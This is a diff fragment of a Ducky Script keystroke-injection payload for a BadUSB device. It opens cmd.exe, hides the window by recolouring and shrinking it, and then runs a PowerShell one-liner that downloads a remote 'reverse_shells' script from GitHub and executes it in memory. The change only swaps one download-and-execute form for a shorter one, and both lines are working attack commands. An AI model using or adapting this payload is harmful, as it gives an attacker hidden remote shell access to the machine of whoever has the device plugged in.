@@ -15,7 +15,7 @@ STRING cmd.exe
 ENTER 
 DELAY 200
 REM @@ Changing the color, risizing the CMD and executing the reverse shell in memory
-STRING cmd /C color FE&mode con:cols=18 lines=1&powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/Hug1n/reverse_shells/main/minrev.ps1')"
+STRING cmd /C color FE&mode con:cols=18 lines=1&powershell "iex(iwr raw.githubusercontent.com/Hug1n/reverse_shells/main/minrev.ps1)"
 DELAY 200
 ENTER
 REM @@ Minimizing the CMD
